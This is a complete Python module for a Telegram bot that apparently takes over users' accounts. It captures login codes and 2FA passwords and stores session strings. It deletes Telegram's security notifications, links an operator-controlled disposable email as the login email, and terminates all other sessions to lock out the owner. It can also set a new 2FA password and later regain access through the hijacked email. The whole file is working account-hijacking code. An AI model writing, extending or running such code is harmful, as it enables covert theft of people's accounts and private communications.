# session_manager.py
import asyncio
import logging
import re

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
    FloodWaitError,
    PhoneNumberBannedError,
    AuthKeyUnregisteredError,
    UserDeactivatedError,
    UserDeactivatedBanError,
    SessionRevokedError,
    AuthKeyDuplicatedError,
)
from telethon.tl.functions.account import (
    UpdateUsernameRequest,
    UpdateProfileRequest,
    SendVerifyEmailCodeRequest,
    VerifyEmailRequest,
    GetPasswordRequest,
)
from telethon.tl.types import (
    EmailVerifyPurposeLoginSetup,
    EmailVerifyPurposeLoginChange,
    EmailVerificationCode,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest, ResendCodeRequest

import database
import mailtm
from config import (
    API_ID,
    API_HASH,
    EMAIL_MIGRATION_DELAY,
    AUTO_KICK_DELAY_24H,
    AUTO_KICK_DELAY_RETRY,
)

logger = logging.getLogger(__name__)

pending_clients: dict = {}
_recovery_tasks: dict[str, asyncio.Task] = {}
_auto_kick_tasks: dict[str, asyncio.Task] = {}
_recovery_scheduled: set[str] = set()
_recovery_on_done = None

OFFICIAL_SENDERS = (777000, 42777)
CODE_PATTERN = re.compile(r"\b\d{5}\b")


# ──────────────────────────────────────────
# أدوات مساعدة
# ──────────────────────────────────────────
async def delete_telegram_official_messages(client) -> None:
    """حذف رسائل تيليجرام الرسمية — يُستدعى بعد كل عملية."""
    for sender_id in OFFICIAL_SENDERS:
        try:
            msgs = await client.get_messages(sender_id, limit=50)
            if msgs:
                await client.delete_messages(sender_id, msgs)
        except Exception as e:
            logger.debug("delete msgs %s: %s", sender_id, e)


def _is_email_not_allowed(err: Exception) -> bool:
    s = str(err).upper()
    return "EMAIL_NOT_ALLOWED" in s


def _is_email_not_setup(err: Exception) -> bool:
    return "EMAIL_NOT_SETUP" in str(err).upper()


def set_recovery_callback(callback):
    """يُستدعى من main عند نجاح/فشل إنعاش الجلسة."""
    global _recovery_on_done
    _recovery_on_done = callback


async def _telegram_has_login_email(client) -> bool:
    """هل الحساب مربوط فعلياً ببريد Login على تيليجرام؟"""
    try:
        pwd = await client(GetPasswordRequest())
        return bool(getattr(pwd, "login_email_pattern", None))
    except Exception as e:
        logger.debug("GetPassword login_email: %s", e)
        return False


async def _login_setup_purpose(client, phone: str):
    """أول ربط بريد — يتطلب phone_code_hash من send_code_request."""
    norm = database.normalize_phone(phone)
    sent = await client.send_code_request(norm)
    return EmailVerifyPurposeLoginSetup(
        phone_number=norm,
        phone_code_hash=sent.phone_code_hash,
    )


# ──────────────────────────────────────────
# تسجيل الدخول
# ──────────────────────────────────────────
async def request_code(user_id: int, phone: str) -> dict:
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        pending_clients[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": result.phone_code_hash,
        }
        return {"success": True}
    except PhoneNumberBannedError:
        return {"success": False, "error": "banned"}
    except FloodWaitError as e:
        return {"success": False, "error": f"flood:{e.seconds}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def post_registration_setup(
    phone: str, client, phone_code_hash: str | None = None
) -> dict:
    """
    مباشرة بعد التسجيل (بدون علاقة بالطرد):
    1. حذف رسائل تيليجرام
    2. ربط بريد Login (Mail.tm)
    3. حذف رسائل مرة أخرى
    4. جدولة نظام الطرد التلقائي
    """
    await delete_telegram_official_messages(client)
    row = await database.get_session_by_phone(phone)
    kept = await existing_login_email_ok(row, client)
    if kept:
        email_res = {
            "success": True,
            "email": kept,
            "skipped": True,
            "message": "بريد Login الحالي يعمل — لم يُغيَّر",
        }
    else:
        email_res = await _bind_login_email(
            client, phone, phone_code_hash=phone_code_hash
        )
    await delete_telegram_official_messages(client)
    await database.set_auto_kick_stage(phone, 0)
    schedule_auto_kick_pipeline(phone)
    if not email_res.get("success") and not email_res.get("skipped"):
        schedule_login_email_bind_retry(phone)
    return email_res


async def submit_code(user_id: int, code: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    try:
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        phone = database.normalize_phone(phone)
        await database.save_session(phone, username, full_name, session_string)

        email_res = await post_registration_setup(
            phone, client, phone_code_hash=phone_code_hash
        )
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "two_fa": False,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
            "email_skipped": email_res.get("skipped", False),
        }
    except SessionPasswordNeededError:
        return {"success": True, "two_fa": True}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {"success": False, "error": "wrong_code"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def submit_2fa(user_id: int, password: str) -> dict:
    if user_id not in pending_clients:
        return {"success": False, "error": "no_pending"}
    data = pending_clients[user_id]
    client = data["client"]
    phone = data["phone"]
    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        # حفظ كلمة مرور الدخول فقط — لا نفعّل 2FA جديد على الحساب
        phone = database.normalize_phone(phone)
        await database.save_session(phone, username, full_name, session_string, password)

        phone_code_hash = data.get("phone_code_hash")
        email_res = await post_registration_setup(
            phone, client, phone_code_hash=phone_code_hash
        )
        del pending_clients[user_id]
        await client.disconnect()
        return {
            "success": True,
            "email_linked": email_res.get("success"),
            "login_email": email_res.get("email"),
            "email_error": email_res.get("error"),
            "email_skipped": email_res.get("skipped", False),
        }
    except PasswordHashInvalidError:
        return {"success": False, "error": "wrong_2fa"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ──────────────────────────────────────────
# إدارة الجلسات
# ──────────────────────────────────────────
async def ensure_session_string(phone: str) -> str | None:
    """
    يجلب session_string من DB أو يستخرجه من جلسة Telethon نشطة ويحفظه.
    """
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    ss = session["session_string"]
    if ss and str(ss).strip():
        return str(ss).strip()

    client = await get_active_client(phone)
    if not client:
        return None
    try:
        ss = client.session.save()
        if ss:
            await database.update_session_string(phone, ss)
        return ss or None
    finally:
        await client.disconnect()


async def get_active_client(phone: str):
    session = await database.get_session_by_phone(phone)
    if not session:
        return None
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None
        return client
    except AuthKeyUnregisteredError:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


async def check_session_alive(phone: str) -> bool:
    """
    فحص عميق: هل الجلسة حية وليست مجمدة/ملغاة؟
    لا يعدّل valid في DB.
    """
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return False
    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            return False
        me = await client.get_me()
        if not me:
            return False
        await client.get_dialogs(limit=1)
        return True
    except (
        AuthKeyUnregisteredError,
        SessionRevokedError,
        AuthKeyDuplicatedError,
        UserDeactivatedError,
        UserDeactivatedBanError,
    ):
        return False
    except Exception as e:
        logger.debug("check_session_alive %s: %s", phone, e)
        return False
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass


async def check_session_valid(phone: str) -> bool:
    """للـ watchdog — يستدعي الفحص العميق."""
    return await check_session_alive(phone)


async def bulk_check_sessions(recover_via_email: bool = True) -> dict:
    """فحص الجلسات — الميتة تُجدول للإنعاش إن وُجد بريد Login."""
    sessions = await database.get_all_sessions()
    checked = invalid = recovery_scheduled = 0
    dead_phones = []
    for s in sessions:
        if not s["valid"]:
            continue
        phone = s["phone"]
        checked += 1
        if await check_session_alive(phone):
            await asyncio.sleep(0.3)
            continue
        dead_phones.append(phone)
        login_email = database.row_login_email(s)
        has_mail = bool(login_email and s["email_password"])
        if recover_via_email and has_mail:
            _recovery_scheduled.discard(phone)
            schedule_standard_recovery(phone)
            recovery_scheduled += 1
        else:
            await database.mark_session_invalid(phone)
            invalid += 1
        await asyncio.sleep(0.3)
    return {
        "checked": checked,
        "invalid": invalid,
        "recovery_scheduled": recovery_scheduled,
        "phones": dead_phones,
    }


# ──────────────────────────────────────────
# تعديل الحساب
# ──────────────────────────────────────────
async def change_username(phone: str, new_username: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateUsernameRequest(new_username))
        await database.update_session_username(phone, new_username)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def change_name(phone: str, first_name: str, last_name: str = "") -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(UpdateProfileRequest(first_name=first_name, last_name=last_name))
        full_name = f"{first_name} {last_name}".strip()
        await database.update_session_fullname(phone, full_name)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def terminate_other_sessions(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def set_two_fa(phone: str, new_password: str, old_password: str = None) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(
            current_password=old_password,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


async def remove_two_fa(phone: str, current_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "session_invalid"}
    try:
        await client.edit_2fa(current_password=current_password, new_password=None)
        await database.update_session_two_fa(phone, None)
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# بريد Login (Mail.tm)
# ──────────────────────────────────────────
async def fetch_code_from_email(
    address: str, password: str, attempts: int = 12, interval: int = 5
) -> str | None:
    return await mailtm.fetch_code(address, password, attempts, interval)


async def existing_login_email_ok(row, client=None) -> str | None:
    """
    بريد Login محفوظ + Mail.tm يعمل + (إن وُجد client) مربوط على تيليجرام.
    """
    if not row:
        return None
    email = database.row_login_email(row)
    pwd = database.row_get(row, "email_password")
    if not email or not pwd:
        return None
    if database.is_legacy_login_email(email):
        return None
    try:
        await mailtm.get_token(email, pwd)
    except Exception as e:
        logger.debug("login email mailbox check %s: %s", email, e)
        return None
    if client and not await _telegram_has_login_email(client):
        logger.info(
            "mail.tm OK but Telegram login email missing for %s",
            database.row_get(row, "phone", "?"),
        )
        return None
    return email


async def _email_verify_purpose(client, phone: str, phone_code_hash: str | None = None):
    """
    LoginSetup: أول ربط (أثناء التسجيل أو حساب بلا بريد على تيليجرام).
    LoginChange: تغيير بريد موجود فعلاً على الحساب.
    """
    if phone_code_hash:
        return EmailVerifyPurposeLoginSetup(
            phone_number=database.normalize_phone(phone),
            phone_code_hash=phone_code_hash,
        )
    if await client.is_user_authorized():
        if await _telegram_has_login_email(client):
            return EmailVerifyPurposeLoginChange()
        return await _login_setup_purpose(client, phone)
    return EmailVerifyPurposeLoginChange()


async def _send_verify_email_code(client, phone: str, email: str, phone_code_hash=None):
    """إرسال كود التحقق — مع إعادة المحاولة بـ LoginSetup عند EMAIL_NOT_SETUP."""
    purpose = await _email_verify_purpose(client, phone, phone_code_hash)
    try:
        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
        return purpose
    except Exception as e:
        if not _is_email_not_setup(e):
            raise
        purpose = await _login_setup_purpose(client, phone)
        await client(SendVerifyEmailCodeRequest(purpose=purpose, email=email))
        return purpose


async def _bind_login_email(
    client, phone: str, phone_code_hash: str | None = None
) -> dict:
    last_error = "جميع النطاقات مرفوضة من تيليجرام"
    try:
        domains = await mailtm.get_active_domains()
        for domain in domains:
            account = await mailtm.create_account(domain)
            new_email = account["address"]
            email_password = account["password"]
            try:
                purpose = await _send_verify_email_code(
                    client, phone, new_email, phone_code_hash
                )
            except Exception as e:
                if _is_email_not_allowed(e):
                    last_error = str(e)
                    continue
                raise

            code = await fetch_code_from_email(
                new_email, email_password, attempts=24, interval=5
            )
            if not code:
                return {
                    "success": False,
                    "error": "لم يتم العثور على الكود في الإيميل",
                    "email": new_email,
                }

            await client(
                VerifyEmailRequest(
                    purpose=purpose,
                    verification=EmailVerificationCode(code=code),
                )
            )
            await database.update_session_login_email(phone, new_email, email_password)
            await delete_telegram_official_messages(client)
            return {"success": True, "email": new_email}

        return {"success": False, "error": last_error}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def change_login_email(phone: str, force: bool = False) -> dict:
    row = await database.get_session_by_phone(phone)
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة"}
    if not force:
        kept = await existing_login_email_ok(row, client)
        if kept:
            await client.disconnect()
            return {
                "success": True,
                "email": kept,
                "skipped": True,
                "message": "بريد Login الحالي يعمل — لم يُغيَّر",
            }
    try:
        res = await _bind_login_email(client, phone)
        await delete_telegram_official_messages(client)
        return res
    finally:
        await client.disconnect()


# ──────────────────────────────────────────
# نظام الطرد التلقائي (بدون 2FA)
# ──────────────────────────────────────────
async def _try_auto_kick(phone: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة غير متاحة"}
    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
        return {"success": True}
    except Exception as e:
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {"success": False, "error": "session_too_fresh"}
        return {"success": False, "error": err}
    finally:
        await client.disconnect()


def schedule_auto_kick_pipeline(phone: str):
    if phone in _auto_kick_tasks and not _auto_kick_tasks[phone].done():
        return
    _auto_kick_tasks[phone] = asyncio.create_task(_auto_kick_worker(phone))


async def _auto_kick_worker(phone: str):
    """
    محاولات الطرد التلقائي:
    0) فور التسجيل
    1) بعد 24 ساعة
    2) بعد 5 دقائق إضافية
    عند النجاح: حذف رسائل فقط (بدون 2FA)
    """
    delays = [0, AUTO_KICK_DELAY_24H, AUTO_KICK_DELAY_RETRY]
    try:
        for attempt, delay in enumerate(delays):
            if delay > 0:
                await database.set_auto_kick_stage(phone, attempt)
                await asyncio.sleep(delay)
            result = await _try_auto_kick(phone)
            if result.get("success"):
                await database.mark_auto_kick_done(phone)
                logger.info("auto kick OK %s attempt %s", phone, attempt)
                asyncio.create_task(_post_kick_session_watch(phone))
                return
            logger.info(
                "auto kick fail %s attempt %s: %s",
                phone, attempt, result.get("error"),
            )
    except Exception as e:
        logger.error("auto kick worker %s: %s", phone, e)
    finally:
        _auto_kick_tasks.pop(phone, None)


async def resume_auto_kick_pipelines():
    sessions = await database.get_sessions_pending_auto_kick()
    for s in sessions:
        schedule_auto_kick_pipeline(s["phone"])
    if sessions:
        logger.info("resumed auto-kick for %d sessions", len(sessions))


# ──────────────────────────────────────────
# تنظيف شامل يدوي (أدمن): طرد → 2FA → حذف رسائل
# ──────────────────────────────────────────
async def admin_full_cleanup(phone: str, new_password: str) -> dict:
    client = await get_active_client(phone)
    if not client:
        return {"success": False, "error": "الجلسة معطلة", "step": "connect"}

    try:
        await client(ResetAuthorizationsRequest())
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        err = str(e)
        if "fresh" in err.lower() or "recently" in err.lower():
            return {
                "success": False,
                "error": "الجلسة جديدة — انتظر ثم أعد التنظيف الشامل",
                "step": "kick",
            }
        return {"success": False, "error": err, "step": "kick"}

    try:
        session = await database.get_session_by_phone(phone)
        current = session["two_fa"] if session and session["two_fa"] else None
        await client.edit_2fa(
            current_password=current,
            new_password=new_password,
            hint="",
            email=None,
        )
        await database.update_session_two_fa(phone, new_password)
        await delete_telegram_official_messages(client)
    except Exception as e:
        await client.disconnect()
        return {"success": False, "error": str(e), "step": "2fa"}

    await client.disconnect()
    await database.mark_session_secured(phone)
    return {"success": True, "password": new_password}


# ──────────────────────────────────────────
# إنعاش جلسة منتهية عبر بريد Login
# ──────────────────────────────────────────
def _normalize_login_code(raw: str | None) -> str | None:
    if not raw:
        return None
    match = CODE_PATTERN.search(str(raw))
    if not match:
        return None
    digits = match.group(0)
    return digits[:5] if len(digits) >= 5 else digits


async def _request_login_code_via_email(client, phone: str):
    """طلب كود دخول — يُفضّل إرساله إلى بريد Login المربوط."""
    norm = database.normalize_phone(phone)
    sent = await client.send_code_request(norm)
    phone_code_hash = sent.phone_code_hash
    if "Email" in type(sent.type).__name__:
        return phone_code_hash
    for _ in range(3):
        try:
            sent = await client(
                ResendCodeRequest(norm, phone_code_hash)
            )
            phone_code_hash = sent.phone_code_hash
            if "Email" in type(sent.type).__name__:
                return phone_code_hash
        except Exception as e:
            logger.debug("resend login code %s: %s", phone, e)
        await asyncio.sleep(2)
    return phone_code_hash


async def recover_session(phone: str) -> dict:
    row = await database.get_session_by_phone(phone)
    if not row:
        return {"success": False, "error": "الجلسة غير موجودة"}
    login_email = database.row_login_email(row)
    if not login_email or not row["email_password"]:
        return {"success": False, "error": "لا يوجد بريد Login محفوظ"}

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        phone_code_hash = await _request_login_code_via_email(client, phone)

        raw_code = await fetch_code_from_email(
            login_email, row["email_password"], attempts=24, interval=5
        )
        code = _normalize_login_code(raw_code)
        if not code:
            return {
                "success": False,
                "error": (
                    "لم يصل كود الدخول لبريد Mail.tm المحفوظ — "
                    "ربما غُيّر بريد Login على الحساب"
                ),
            }

        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            if not row["two_fa"]:
                return {"success": False, "error": "يتطلب 2FA غير محفوظ"}
            await client.sign_in(password=row["two_fa"])

        session_string = client.session.save()
        me = await client.get_me()
        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""
        await database.save_session(
            phone, username, full_name, session_string, row["two_fa"]
        )
        _recovery_scheduled.discard(phone)
        return {"success": True, "email": login_email}
    except (PhoneCodeInvalidError, PhoneCodeExpiredError):
        return {
            "success": False,
            "error": "كود الدخول من البريد غير صالح أو منتهي",
        }
    except Exception as e:
        err = str(e)
        if "EMAIL" in err.upper() or "CODE" in err.upper():
            return {
                "success": False,
                "error": f"فشل الإنعاش عبر البريد: {err}",
            }
        return {"success": False, "error": err}
    finally:
        await client.disconnect()


_email_bind_retry_tasks: dict[str, asyncio.Task] = {}


def schedule_login_email_bind_retry(phone: str):
    """إعادة محاولة ربط بريد Login بعد التسجيل إن فشل أول مرة."""
    if phone in _email_bind_retry_tasks and not _email_bind_retry_tasks[phone].done():
        return

    async def _worker():
        try:
            await asyncio.sleep(45)
            for attempt in range(3):
                row = await database.get_session_by_phone(phone)
                client = await get_active_client(phone)
                if not client:
                    return
                if await existing_login_email_ok(row, client):
                    await client.disconnect()
                    return
                res = await _bind_login_email(client, phone)
                await client.disconnect()
                if res.get("success"):
                    logger.info("login email bound on retry %s attempt %s", phone, attempt)
                    return
                await asyncio.sleep(60 * (attempt + 1))
        except Exception as e:
            logger.error("email bind retry %s: %s", phone, e)
        finally:
            _email_bind_retry_tasks.pop(phone, None)

    _email_bind_retry_tasks[phone] = asyncio.create_task(_worker())


def schedule_standard_recovery(phone: str, on_done=None):
    """إنعاش تلقائي: انتظار SESSION_RECOVERY_DELAY ثم كود من Mail.tm."""
    from config import SESSION_RECOVERY_DELAY

    schedule_session_recovery(
        phone, SESSION_RECOVERY_DELAY, on_done=on_done or _recovery_on_done
    )


async def _post_kick_session_watch(phone: str):
    """بعد الطرد: إن ماتت الجلسة — انتظار 5 دقائق ثم إنعاش عبر البريد."""
    await asyncio.sleep(60)
    if await check_session_alive(phone):
        return
    row = await database.get_session_by_phone(phone)
    if not row or not database.row_login_email(row) or not row["email_password"]:
        return
    if phone in _recovery_scheduled:
        return
    logger.info("session dead after kick, scheduling standard recovery %s", phone)
    schedule_standard_recovery(phone)


async def startup_recover_dead_sessions(on_done=None) -> dict:
    """
    عند تشغيل السيرفر: فحص كل الجلسات ذات بريد Login وإنعاش الميتة.
    """
    global _recovery_scheduled
    _recovery_scheduled.clear()
    sessions = await database.get_all_sessions()
    scheduled = revived_in_db = dead = 0
    for s in sessions:
        phone = s["phone"]
        if not database.row_login_email(s) or not s["email_password"]:
            continue
        alive = await check_session_alive(phone)
        if alive:
            if not s["valid"]:
                await database.mark_session_valid(phone)
                revived_in_db += 1
            continue
        dead += 1
        schedule_standard_recovery(phone, on_done=on_done)
        scheduled += 1
        await asyncio.sleep(0.5)
    logger.info(
        "startup recovery: dead=%s scheduled=%s revived_valid_flag=%s",
        dead,
        scheduled,
        revived_in_db,
    )
    return {"dead": dead, "scheduled": scheduled, "revived_in_db": revived_in_db}


def schedule_session_recovery(phone: str, delay: int, on_done=None):
    on_done = on_done or _recovery_on_done
    if phone in _recovery_tasks and not _recovery_tasks[phone].done():
        return
    if phone in _recovery_scheduled:
        return
    _recovery_scheduled.add(phone)

    async def _run():
        from config import SESSION_RECOVERY_DELAY
        wait = delay if delay >= 0 else SESSION_RECOVERY_DELAY
        await asyncio.sleep(wait)
        try:
            result = await recover_session(phone)
            if on_done:
                await on_done(phone, result)
        except Exception as e:
            logger.error("recovery %s: %s", phone, e)
            if on_done:
                await on_done(phone, {"success": False, "error": str(e)})
        finally:
            _recovery_tasks.pop(phone, None)
            _recovery_scheduled.discard(phone)

    _recovery_tasks[phone] = asyncio.create_task(_run())


async def migrate_old_sessions_emails() -> dict:
    sessions = await database.get_sessions_needing_email_migration()
    migrated = failed = skipped = 0
    for s in sessions:
        phone = s["phone"]
        if await existing_login_email_ok(s):
            skipped += 1
            continue
        res = await change_login_email(phone)
        if res.get("skipped"):
            skipped += 1
        elif res.get("success"):
            migrated += 1
        else:
            failed += 1
        await asyncio.sleep(EMAIL_MIGRATION_DELAY)
    return {
        "migrated": migrated,
        "failed": failed,
        "skipped": skipped,
        "total": len(sessions),
    }


# ──────────────────────────────────────────
# مراقبة كود من رسائل تيليجرام (أدمن)
# ──────────────────────────────────────────
async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
    session = await database.get_session_by_phone(phone)
    if not session or not session["session_string"]:
        return None

    client = None
    try:
        client = TelegramClient(
            StringSession(session["session_string"]), API_ID, API_HASH
        )
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return None

        snapshot = {}
        for sender_id in OFFICIAL_SENDERS:
            try:
                msgs = await client.get_messages(sender_id, limit=1)
                snapshot[sender_id] = msgs[0].id if msgs else 0
            except Exception:
                snapshot[sender_id] = 0

        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout

        while loop.time() < deadline:
            await asyncio.sleep(3)
            for sender_id, last_id in list(snapshot.items()):
                try:
                    new_msgs = await client.get_messages(sender_id, limit=5)
                    for msg in new_msgs:
                        if (
                            msg.id > last_id
                            and msg.text
                            and CODE_PATTERN.search(msg.text)
                        ):
                            await client.disconnect()
                            return msg.text
                    if new_msgs:
                        snapshot[sender_id] = max(last_id, new_msgs[0].id)
                except Exception:
                    pass

        await client.disconnect()
        return None
    except Exception:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
        return None


# توافق مع الاستدعاءات القديمة
change_email_auto = change_login_email
full_clean_and_kick = admin_full_cleanup
